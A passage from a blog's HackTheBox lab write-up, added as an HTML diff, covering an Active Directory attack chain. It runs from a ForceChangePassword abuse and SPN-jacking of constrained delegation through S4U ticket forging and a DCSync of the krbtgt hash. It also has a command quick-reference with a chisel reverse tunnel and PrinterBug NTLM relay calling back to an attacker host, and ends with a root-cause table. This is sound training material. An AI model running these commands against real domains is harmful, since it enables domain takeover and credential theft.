+<span class="pg">[redacted — user flag]</span></div>
+  </div>
+
+  <!-- ══ FORCECHANGE ══ -->
+  <h2>Lateral — ForceChangePassword to a delegation account</h2>
+
+  <p>Back to the domain with real user creds. <code>a.white</code> holds a <strong>ForceChangePassword</strong> right over <code>a.white_adm</code> — the ability to reset that account's password without knowing the old one. The DC is directly reachable, so no tunnel needed here:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">reset a.white_adm</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">bloodyAD --host dc01.pirate.htb -d pirate.htb -u a.white -p 'E2nvAOKSz5Xz2MJu' \
+     set password 'a.white_adm' '1Qwerty!'</span>
+<span class="pg">[+] Password changed successfully!</span></div>
+  </div>
+
+  <p>Why <code>a.white_adm</code> matters becomes clear the moment you look at its delegation config:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">findDelegation</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">findDelegation.py 'pirate.htb/a.white_adm:1Qwerty!' -dc-ip &lt;DC_IP&gt;</span>
+<span class="po">AccountName  DelegationType                      DelegationRightsTo
+-----------  ----------------------------------  ---------------------</span>
+<span class="py">a.white_adm  Constrained w/ Protocol Transition  http/WEB01.pirate.htb</span></div>
+  </div>
+
+  <p><strong>Constrained delegation with protocol transition</strong> (the account's <code>TRUSTED_TO_AUTH_FOR_DELEGATION</code> flag) means <code>a.white_adm</code> can call S4U2Self to fabricate a usable ticket for <em>any</em> user, then S4U2Proxy to forward it to the service named in <code>msDS-AllowedToDelegateTo</code> — here, <code>http/WEB01.pirate.htb</code>. On paper that only lets us hit a web service on WEB01, which we already own. The trick is what "the SPN" actually points at.</p>
+
+  <!-- ══ SPN JACK ══ -->
+  <h2>Root — SPN-jacking constrained delegation onto the DC</h2>
+
+  <p>When the KDC issues an S4U2Proxy ticket for <code>http/WEB01.pirate.htb</code>, it encrypts that ticket with the long-term key of <strong>whatever account currently owns that SPN</strong>. Right now that's <code>WEB01$</code>. But SPNs are just multi-valued attributes, they must be unique in the forest, and — crucially — <code>a.white_adm</code> can write <code>servicePrincipalName</code> on both <code>WEB01$</code> and <code>DC01$</code>. So <strong>move the SPN</strong>: delete <code>http/WEB01.pirate.htb</code> from <code>WEB01$</code>, add it to <code>DC01$</code>. Now the same S4U2Proxy request yields a ticket encrypted with the <em>DC's</em> key.</p>
+
+  <p>I did the move surgically with <code>ldapmodify</code> so the DC's other 24 SPNs stayed untouched (order matters — delete before add, or the uniqueness constraint rejects it):</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">move the SPN WEB01$ → DC01$</span>
+    </div>
+    <div class="term-body"><span class="pco"># delete from WEB01$</span>
+<span class="pd">$ </span><span class="pc">ldapmodify -x -H ldap://&lt;DC_IP&gt; -D 'a.white_adm@pirate.htb' -w '1Qwerty!' &lt;&lt;'EOF'
+dn: CN=WEB01,CN=Computers,DC=pirate,DC=htb
+changetype: modify
+delete: servicePrincipalName
+servicePrincipalName: HTTP/WEB01.pirate.htb
+EOF</span>
+<span class="pco"># add to DC01$</span>
+<span class="pd">$ </span><span class="pc">ldapmodify -x -H ldap://&lt;DC_IP&gt; -D 'a.white_adm@pirate.htb' -w '1Qwerty!' &lt;&lt;'EOF'
+dn: CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb
+changetype: modify
+add: servicePrincipalName
+servicePrincipalName: HTTP/WEB01.pirate.htb
+EOF</span>
+<span class="po">modifying entry "CN=WEB01,CN=Computers,DC=pirate,DC=htb"
+modifying entry "CN=DC01,OU=Domain Controllers,DC=pirate,DC=htb"</span></div>
+  </div>
+
+  <p>Now the payoff. Request the delegated ticket for <code>http/WEB01.pirate.htb</code> impersonating <code>administrator</code> — it comes back sealed with <code>DC01$</code>'s key — and use <strong><code>-altservice</code></strong> to rewrite the service name in the ticket to <code>cifs/DC01</code>. That sname substitution is legal because both service classes are served by the same account key, and it turns a "web" ticket into an SMB ticket to the domain controller:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">getST — S4U + altservice</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">faketime -f '+7h' getST.py -spn 'http/WEB01.pirate.htb' -impersonate administrator \
+     'pirate.htb/a.white_adm:1Qwerty!' -dc-ip &lt;DC_IP&gt; -altservice 'cifs/DC01.pirate.htb'</span>
+<span class="po">[*] Requesting S4U2Proxy
+[*] Changing service from http/WEB01.pirate.htb@PIRATE.HTB to cifs/DC01.pirate.htb@PIRATE.HTB</span>
+<span class="pg">[*] Saving ticket in administrator@cifs_DC01.pirate.htb@PIRATE.HTB.ccache</span></div>
+  </div>
+
+  <p>That's an Administrator ticket to the DC's own <code>cifs</code> service — game over. Read the root flag, and DCSync to make the domain compromise explicit:</p>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">root.txt + DCSync</span>
+    </div>
+    <div class="term-body"><span class="pd">$ </span><span class="pc">KRB5CCNAME=administrator@cifs_DC01...ccache faketime -f '+7h' \
+     smbclient.py -k -no-pass dc01.pirate.htb</span>
+<span class="pd"># </span><span class="pc">use C$</span>
+<span class="pd"># </span><span class="pc">get Users\Administrator\Desktop\root.txt</span>
+<span class="pg">[redacted — root flag]</span>
+<span class="pd">$ </span><span class="pc">KRB5CCNAME=administrator@cifs_DC01...ccache faketime -f '+7h' \
+     secretsdump.py -k -no-pass -just-dc-user krbtgt dc01.pirate.htb</span>
+<span class="pg">krbtgt:502:aad3b435...:33071738...:::                      </span><span class="pco"># golden-ticket capable</span></div>
+  </div>
+
+  <div class="alert alert-success">Constrained delegation gates <em>which service</em> you can reach, never <em>which account owns that service's name</em>. If a principal can rewrite <code>servicePrincipalName</code> on a computer object — especially the DC — then the delegation target it "safely" points at is a moving object. Treat write access to <code>servicePrincipalName</code> on privileged accounts as equivalent to control of everything that delegates to them.</div>
+
+  <!-- ══ macOS ══ -->
+  <h2>Operator notes — running this from macOS</h2>
+
+  <p>None of the tradecraft changes on a Mac, but a few sharp edges are worth writing down:</p>
+
+  <ul>
+    <li><strong>Kerberos clock skew.</strong> The DC ran +7h ahead. <code>faketime -f '+7h' &lt;tool&gt;</code> shifts a single process's clock without touching the system — cleaner than <code>ntpdate</code>, which wants root and drags your whole box off real time. bloodyAD self-corrects, so it needs no wrapper.</li>
+    <li><strong>Machine and gMSA accounts refuse NTLM logon</strong> (<code>STATUS_NOLOGON_WORKSTATION_TRUST_ACCOUNT</code>) — a wrong password and a policy refusal look almost identical, so verify with a TGT (<code>getTGT.py</code>), which is the auth path that actually works.</li>
+    <li><strong>proxychains + netexec don't mix</strong> on macOS: netexec's multiprocessing workers don't inherit the <code>DYLD_INSERT_LIBRARIES</code> preload, so nothing gets hooked. Single-process Impacket scripts proxy fine, which is why the relay-side steps are all Impacket.</li>
+    <li><strong>faketime + proxychains together</strong> means two dylibs in <code>DYLD_INSERT_LIBRARIES</code> at once — set the variable manually with both paths rather than nesting the two wrappers, or one clobbers the other.</li>
+    <li><strong>The relay callback found its way home.</strong> WEB01 sits on an internal-only segment, but its spooler callback to my VPN IP routed out through the dual-homed DC — so no reverse port-forward on 445 was needed, which is the part that's normally painful to tunnel.</li>
+  </ul>
+
+  <!-- ══ WRAP ══ -->
+  <h2>Why it worked</h2>
+
+  <table class="st">
+    <tr><th>Stage</th><th>Root cause</th></tr>
+    <tr><td>→ MS01$</td><td>Pre-Windows 2000 machine account never joined, still holding its bootstrap password = lowercase name (weak default credential, CWE-1392)</td></tr>
+    <tr><td>→ DC01 (WinRM)</td><td>gMSA managed password readable by an account we now control — over-broad <code>msDS-GroupMSAMembership</code></td></tr>
+    <tr><td>→ WEB01 / a.white</td><td>SMB signing disabled + machine-account coercion (PrinterBug) → NTLM relay to LDAP → RBCD; domain creds left in an LSA autologon secret (CWE-294 / CWE-522)</td></tr>
+    <tr><td>→ a.white_adm</td><td>ForceChangePassword DACL over a privileged, delegation-enabled account (CWE-269)</td></tr>
+    <tr><td>→ Domain Admin</td><td>Constrained-delegation SPN is mutable; writable <code>servicePrincipalName</code> on the DC lets you SPN-jack the target onto <code>DC01$</code> (CWE-266)</td></tr>
+  </table>
+
+  <h2>Key commands</h2>
+
+  <div class="terminal">
+    <div class="term-bar">
+      <span class="dot dr"></span><span class="dot dy"></span><span class="dot dg"></span>
+      <span class="term-label">quick reference</span>
+    </div>
+    <div class="term-body"><span class="pco"># 1. pre2k machine account → Kerberos TGT</span>
+<span class="pc">nxc ldap &lt;DC_IP&gt; -u pentest -p 'p3nt3st2025!&amp;' -M pre2k</span>
+<span class="pc">getTGT.py 'pirate.htb/MS01$:ms01' -dc-ip &lt;DC_IP&gt;</span>
+
+<span class="pco"># 2. read gMSA managed password → WinRM on DC01</span>
+<span class="pc">KRB5CCNAME=MS01$.ccache bloodyAD --host dc01.pirate.htb -d pirate.htb -k get object 'gMSA_ADFS_prod$' --attr msDS-ManagedPassword</span>
+<span class="pc">evil-winrm -i dc01.pirate.htb -u 'gMSA_ADFS_prod$' -H &lt;gmsa-hash&gt;</span>
+
+<span class="pco"># 3. pivot to 192.168.100.0/24 (chisel reverse SOCKS)</span>
+<span class="pc">./chisel server --reverse --socks5 -p 9001      # attacker</span>
+<span class="pc">c.exe client &lt;ATTACKER&gt;:9001 R:socks            # on DC01</span>
+
+<span class="pco"># 4. RBCD via relay + PrinterBug → a.white (user.txt)</span>
+<span class="pc">addcomputer.py -computer-name 'hackpuntes$' -computer-pass '1Qwerty!' -dc-host dc01.pirate.htb -hashes :&lt;gmsa-hash&gt; 'pirate.htb/gMSA_ADFS_prod$'</span>
+<span class="pc">sudo ntlmrelayx.py -t ldap://&lt;DC_IP&gt; -smb2support --remove-mic --delegate-access --escalate-user 'hackpuntes$'</span>
+<span class="pc">proxychains4 python3 printerbug.py -no-ping -hashes :&lt;gmsa-hash&gt; 'pirate.htb/gMSA_ADFS_prod$'@192.168.100.2 &lt;ATTACKER&gt;</span>
+<span class="pc">faketime -f '+7h' getST.py -spn cifs/WEB01.pirate.htb -impersonate Administrator 'pirate.htb/hackpuntes$:1Qwerty!' -dc-ip &lt;DC_IP&gt;</span>
+<span class="pc">proxychains4 secretsdump.py -k -no-pass -target-ip 192.168.100.2 WEB01.pirate.htb</span>
+
+<span class="pco"># 5. ForceChangePassword + SPN-jack → Domain Admin (root.txt)</span>
+<span class="pc">bloodyAD --host dc01.pirate.htb -d pirate.htb -u a.white -p '&lt;pw&gt;' set password 'a.white_adm' '1Qwerty!'</span>
+<span class="pc">ldapmodify ... delete HTTP/WEB01.pirate.htb from WEB01$ ; add it to DC01$</span>
+<span class="pc">faketime -f '+7h' getST.py -spn 'http/WEB01.pirate.htb' -impersonate administrator 'pirate.htb/a.white_adm:1Qwerty!' -dc-ip &lt;DC_IP&gt; -altservice 'cifs/DC01.pirate.htb'</span>
+<span class="pc">faketime -f '+7h' secretsdump.py -k -no-pass -just-dc dc01.pirate.htb</span></div>
+  </div>
+
+</div>
+<div class="htb-cta">
+  <a href="https://app.hackthebox.com/users/332355" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><polygon points="12 2 22 8.5 22 15.5 12 22 2 15.5 2 8.5"/><line x1="12" y1="22" x2="12" y2="15.5"/><polyline points="22 8.5 12 15.5 2 8.5"/></svg>
+    <span><span class="l-t">HackTheBox</span><span class="l-s">My HTB profile &amp; more boxes</span></span>
+    <span class="l-x">↗</span>
+  </a>
+  <a href="https://github.com/s-markakis" target="_blank" rel="noopener">
+    <svg viewBox="0 0 24 24"><path d="M9 19c-5 1.5-5-2.5-7-3m14 6v-3.87a3.37 3.37 0 0 0-.94-2.61c3.14-.35 6.44-1.54 6.44-7A5.44 5.44 0 0 0 20 4.77 5.07 5.07 0 0 0 19.91 1S18.73.65 16 2.48a13.38 13.38 0 0 0-7 0C6.27.65 5.09 1 5.09 1A5.07 5.07 0 0 0 5 4.77a5.44 5.44 0 0 0-1.5 3.78c0 5.42 3.3 6.61 6.44 7A3.37 3.37 0 0 0 9 18.13V22"/></svg>
+    <span><span class="l-t">GitHub</span><span class="l-s">Open-source security &amp; automation tools</span></span>
+    <span class="l-x">↗</span>
+  </a>
+</div>
+<footer>
+  <span>© 2026 <a href="https://s-markakis.github.io/index.html">S. Markakis</a></span>
+  <span><a href="https://s-markakis.github.io/blog.html">← All posts</a></span>
+</footer>
+
+<script src="../js/i18n.js" defer></script>
+<script src="../js/nav.js" defer></script>
+<script src="../js/writeup-sidebar.js" defer></script>
+<script src="../js/writeup-enhance.js" defer></script>
+</body>
+</html>
